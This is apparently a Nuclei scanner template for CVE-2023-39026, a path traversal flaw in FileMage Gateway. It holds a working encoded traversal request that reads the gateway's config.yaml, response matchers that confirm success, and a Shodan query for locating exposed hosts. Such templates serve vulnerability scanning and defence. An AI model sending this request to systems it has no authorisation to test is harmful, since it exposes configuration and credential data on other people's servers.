id: CVE-2023-39026

info:
  name: FileMage Gateway LFI
  author: thecyberneh
  severity: high
  description: |
    Unauthenticated Path Traversal in FileMage Gateway (v.1.10.8 and before) through Unauthenticated HTTP(S) GET Request
  reference:
    - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html
  classification:
    cve-id: CVE-2023-39026
  metadata:
    max-request: 1
    shodan-query: http.title:"FileMage Gateway"
    verified: "true"
  tags: cve,cve2023,lfi,unauth,filemage

http:
  - method: GET
    path:
      - '{{BaseURL}}/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'user'
          - 'filemage'
          - 'localhost'
        condition: and


      - type: status
        status:
          - 200
